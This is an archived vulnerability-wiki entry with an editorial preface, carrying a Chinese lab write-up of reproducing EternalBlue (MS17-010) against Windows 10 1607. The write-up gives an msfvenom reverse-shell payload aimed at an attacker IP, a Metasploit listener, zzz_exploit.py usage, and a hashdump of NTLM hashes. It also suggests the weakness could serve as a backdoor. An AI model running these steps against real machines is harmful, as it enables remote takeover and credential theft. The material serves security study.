---
cve: "CVE-2017-0145"
identifier_role: "primary"
primary_identifiers: "CVE-2017-0145"
referenced_identifiers: "CVE-2017-0146;CVE-2017-0147;CVE-2017-0148"
identifier_status: "unknown"
title: "永恒之蓝 Windows10 版踩坑复现"
product: "Windows SMB / worawit MS17-010 工具链"
record_type: "unknown"
document_type: "MS17-010 Win10工具适配与失败记录"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "Win10 1607x64，旧MSF或Python2 zzz_exploit、可匿名管道/共享；需SMB可达与未修补；具体MSF提交/系统build未列"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Windows/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20Windows10%20%E7%89%88%E8%B8%A9%E5%9D%91%E5%A4%8D%E7%8E%B0.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/H8cOsXmH0EzDPEBsPgvMrg"
id: "vw-6073e500646f60b51b84c490"
entity_id: "ve-6073e500646f60b51b84c490"
schema_version: "1"
---

# 永恒之蓝 Windows10 版踩坑复现

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Windows SMB / worawit MS17-010 工具链
- 文献类型：MS17-010 Win10工具适配与失败记录
- 版本、权限及部署边界：Win10 1607x64，旧MSF或Python2 zzz_exploit、可匿名管道/共享；需SMB可达与未修补；具体MSF提交/系统build未列
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. EternalBlue、MS17-010全公告、zzz_exploit不同利用变体混称，frontmatter0145不能仅因列表首项确认主CVE，应按实际链核映射
2. 所有开机联网可侵/Win7成功近100%与Win10实战无用两极化结论无统计支持，需限定此次模块/配置
3. 关闭Defender、更新、防火墙，匿名共享以及开放3389允许任何人属于人为弱化试验条件；3389与SMB漏洞机制无直接关系，不能当通用解决方案
4. MSF5/6失败与作者借用他人截图混合，必须标自测/他人证据；图中修改源码行在正文缺失，无法独立重现
5. 进程架构迁移后hashdump成功是后渗透差异，不是漏洞提权必要步骤；不应将未修漏洞建议为后门
6. 保留Win10独立失败经验和worawit源码，补官方补丁/恢复说明及固定版本；截图未视检

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/H8cOsXmH0EzDPEBsPgvMrg>
- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
- 原文参考链接（未重新核验）：<https://www.freebuf.com/vuls/349281.html>
- 原文参考链接（未重新核验）：<https://blog.csdn.net/shuryuu/article/details/121159254>
- 原文参考链接（未重新核验）：<https://github.com/worawit/MS17-010>
- 原文参考链接（未重新核验）：<https://github.com/MrWQ/vulnerability-paper>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H8cOsXmH0EzDPEBsPgvMrg)

✎ 阅读须知

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经允许，禁止转载！

本文所提供的工具仅用于学习，禁止用于其他，请在 24 小时内删除工具文件！！！

1. 背景介绍
=======

永恒之蓝 (`ms17-010`) 通过`TCP`端口`445`和`139`来利用`SMBv1`和`NBT`中的远程代码执行漏洞，恶意代码会扫描开放`445`文件共享端口的`Windows`机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

参考：https://www.freebuf.com/vuls/349281.html

本文有其他师傅的帮助，感谢各位师傅。

其实永恒之蓝这个漏洞影响的范围非常广，大致有以下类型：

```
Windows 2016 x64
Windows 10 Pro Vuild 10240 x64
Windows 2012 R2 x64
Windows 8.1 x64
Windows 2008 R2 SP1 x64
Windows 7 SP1 x64
Windows 2008 SP1 x64
Windows 2003 R2 SP2 x64
Windows XP SP2 x64
Windows 8.1 x86
Windows 7 SP1 x86
Windows 2008 SP1 x86
Windows 2003 SP2 x86
Windows XP SP3 x86
Windows 2000 SP4 x86


```

相关的`cve`有：CVE-2017-0145、CVE-2017-0146、CVE-2017-0147、CVE-2017-0148

基本上我们搜索永恒之蓝漏洞复现，`99%`的师傅选择的都是`Windows7`或者`Windows server2008`，因为这两个系统复现的成功了将近`100%`（在存在漏洞的情况下），复现的前提条件是：

*   关闭防火墙
    
*   关闭杀软（当然`win7`和`08`本身不带有任何杀软）
    
*   确认`445`端口开放
    

但是在上述列表中，该漏洞甚至还影响`Windows10`、`Windows server2016`等，所以在这里复现的时候，查找了很多资料，只在`YouTube`上看到部分复现的视频，上面复现使用的是`Windows server2016 standard Evaluation`版本，后来我们尝试使用非常多的镜像版本去尝试复现：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/49757ef3cddda5f3f417e1a6eb91b4c79e772953d2bcf896299d16d2db3f5ddf.png)  

其中有一个`Windows10 pro`英文版，其他师傅短暂复现成功过一次之后，其他均失败。

2. Windows10 1607 版本漏洞复现
========================

后来经过`曾哥`师傅的指点，在`Windows10 1511`和`1607`的版本上可能存在漏洞，并且他在`1607`版本上复现成功，经过整理发现，复现成功需要以下条件：

*   关闭`Windows defender`
    
*   禁止`Windows10`更新
    
*   关闭防火墙
    
*   **在本地计算机策略里面，修改本地策略的安全选项，设置可匿名访问的共享**
    
*   **使用老版本 msf 或者使用工具自己跑**
    

### 2.1 msf 新版

攻击机：`mac` `10.30.1.214`  
靶机：`Windows10`虚拟机 `1607`版本`192.168.135.28`

当然啦，我们先按照新版本`msf6`和不关闭组策略的情况下进行测试，先安装了一个`1607`版本的镜像虚拟机：

```
ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jul_2016_x64_dvd_9056935.iso|4347183104|35EA5DB0F3BB714F5CE0740FB89D82D1|/


```

先关闭其他的杂项，关闭`Windows defender`：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/81e9ce960f08fd88fbd83e46c1f759f2f71b5bb07cfb7686079e8df82a89427d.png)  

关闭防火墙等，不设置可匿名访问的共享，在这里查看`ip`和版本信息：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/e004ba4eaa1ac63c5b9c7afc238b4366063a20e155b2927d064808d25df5a9aa.png)  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/925e25797df192e62610565bf9a3594e19aa3e70b4d7a0dd80418a40063682a4.png)  

使用`msf6`来进行测试：

  

使用第一个进行测试，在这里面的第二个`2023`的那个，是老版本`msf5`里面的，是我自己加上去的，后续再说：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/a92d16b03125af3aecfe0cb2ad4dd2698cbf26e2bf2eeb6008b632ba34923bc9.png)  

在这里发现，无论如何`run`，都会存在一个错误，这是网络连接错误，在这里就按照上面师傅的要求**设置可匿名访问的共享**，再跑：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/a4f7b07e335c7db8d9c5e6511b8d18afdae18f33d0b9d13f60660f6f64f12744.png)  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/31b359283b38705db94f51b5be969f549b9197bfc1002df0f7ad12dd2435d784.png)  

在这里设置为`\`，保存之后再跑一下：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/7e1cb72014836a47ddadf89ef561771079f105c14298b41d82bfa8be92b859f0.png)  

这次没有错误了，但是你无论如何`run`，会话就回不来，看下当前模块支持的系统类型：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/1d1eb1fc56a60a55d7e3703955f2345609bd4757d478e1ebeebf04a26a167540.png)  

当前是支持这里面的`win10`的，可能是系统不对的问题，如果使用老版的`msf`来执行的话，其实可以直接弹回来的，在这里借用`橘子`师傅的截图：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/f39a446bd960c5e9050b1961d4c5b574b32636382aa258fac734f1a81ef3e941.png)  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/2f64238286959e83cd901df5f45e91a52c34efb119c34059d74739a1e8ad498d.png)  

当然如果将`msf5`版本的模块直接放到`msf6`里面使用的话，会因为一些问题发生报错，可能是因为版本的问题：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/0e207b02a008b111b62665ca3ac4082025db09b8a01b95aa4ef55299ac89aeef.png)  

### 2.2 工具版

攻击机：`mac` `10.30.1.214`靶机：`Windows10`虚拟机 `1607`版本 `192.168.135.28`

如果不使用`msf`的话，在这里参考以下师傅的文章，利用工具来进行复现，当然前提依旧是需要**设置可匿名访问的共享：**

```
https://blog.csdn.net/shuryuu/article/details/121159254


```

工具地址：

```
https://github.com/worawit/MS17-010


```

#### 2.2.1 检测永恒之蓝漏洞

将`github`上工具下载到本地之后，先试用脚本检测下是否存在永恒之蓝漏洞，在这里使用`Python2`：

```
python checker.py 192.168.135.28


```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/a8eed3a7e9704cbe9e2a808f6f6cfbd385fc9038e093459517e7855293994011.png)  

上图是正常的，如果是不正常的会显示：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/603d768adcfd4d4114b8bfe333e6e9a46600eaa08b18cbda873bd1a9f32e3c5c.png)  

当前如果再执行`exp`的话，会失败。

#### 2.2.2 漏洞利用

首先生成一个`exe`，等会回弹到本地来：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.30.1.214  LPORT=7788  -f  exe  -o  7788.exe 


```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/8af79aa69cd723177ec6412cbbfdf7ab293b2a82e3a277b74960b45d3659551a.png)  

另外一侧，打开`msf`，准备接收会话：

```
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp 
set lhost 10.30.1.214 
set lport 7788
run


```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/e969e4572b19f6ea8f613f2849e75e3a3fe24de8de3fb6a80a1ba47e2b94961f.png)  

打开刚下载的代码中的`zzz_exploit.py`文件，注释以下几行：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/eff3c74db257ff104cacc977b6b56b379761b0c2643bf3fb0fd6d82708e84285.png)  

取消注释以下几行，并修改其中的文件：![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/eca670cfff48ad109ab82aadf601bf37a5b7094cbeea2fab3203084e1dff4ef1.png)

在这里注意：第一个`7788.exe`是要和你的脚本在同一个文件夹下，如果不在的话，可以写其他的绝对路径，比如：`/tmp/1.exe`，如果永恒之蓝漏洞执行成功的话，就会将这个文件传到靶机的`C`盘下，文件名就是`7788.exe`。修改好之后，准备执行：

```
python zzz_exploit.py  192.168.135.28 netlogon(这个可以不带)


```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/4f01c8220a3bcf9e2bff643cf654ab43fb566f9004e57c87e7b6b58f64a60878.png)  

此时会话就弹回来了：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c1b87be0fc6d391d348b1821f4e57ea6690fb5901e17852017fbdc7fbc3ab6d6.png)  
![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/350ee21c4e7d4b10811510b06154ec5f87f6ce7550f9abdfd4f564451daa1528.png)  

此时尝试抓取`hash`：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/cdd7225b97ffba00160ad389236e1b3106750969959dd22dfa3dd7469541871d.png)  

显示无法抓取，应该是进程问题，将进程由`x86`的迁移至`x64`的应该就可以了，查看下当前的进程：

```
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getpid
Current pid: 5616
meterpreter > ps


```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/27639630f0b74f7e97ee9bb40a015cb7e29854bcde5a4a121c064b83084c4ae2.png)  

将当前的进程迁移至`session`为`0`，权限是`system`的`x64`的进程上来：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/3df440bf3a05fad61d026a5e2b8ae16bbb3de47b96507b1e2b7c8d80262e069f.png)  

迁移到`308`上：

```
meterpreter > migrate 308
[*] Migrating from 5616 to 308...
[*] Migration completed successfully.
meterpreter > hashdump
admin:1000:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/180e4ee344cbee4c2f4690cf44603d0376e69b72f20af240c52238faa694443b.png)  

再进行解密即可：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/195a61a4907cca6ffc422cf38e16c6e4cb5f0f554dc9f53f31cbaebf0825fea8.png)  

### 2.3 影响 Windows10 漏洞的因素

其实在上面`2.2`执行的时候，有些步骤配置了，但是依旧失败：

*   关闭`Windows defender`
    
*   禁止`Windows10`更新
    
*   关闭防火墙
    
*   **在本地计算机策略里面，修改本地策略的安全选项，设置可匿名访问的共享**
    

但是在重启之后，就可以了，在这里经过测试发现，**设置可匿名访问的共享**是当前`Windows10`版本利用的必要条件。如果以上还不能成功，可以尝试开启`3389`，允许任何人访问。

并在本地安全策略中，关闭以下选项，重启之后再测试：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/95694a351fb2db968e6996ac7197ba5a29855140512160cf94def456636012fb.png)  

3. 总结
=====

本次`Windows10`版本的永恒之蓝漏洞，理论上利用比较苛刻，需要手动配置，所以在实战中，基本上没有太大用处，但是不妨可以作为后门的一种。

tips：加我 wx，拉你入群，一起学习

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/4146ddead8b3275fb4ad3f77acc24319ebfbf0c220f8acefbd7bbd0ee51b09ce.jpg)

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/7ee2d983d48eae08e5027991dbceca30341eaa8662320aed98d76f6e21dc581e.jpg)

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/70860a31ae8f501cf5c7091f9ccfc7c5c328b1f6131e137352ae35d5a1ec26e1.png)

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/9dabb2363040f0c22206158a4692cb7a4c54e78c07ad2fab94af5342792e477a.jpg)

扫取二维码获取

更多精彩

乌鸦安全

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/48b01a30cd9d6162cffb9c2d9e709f02f0a1a027412c4149bff2424182c92e15.gif)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
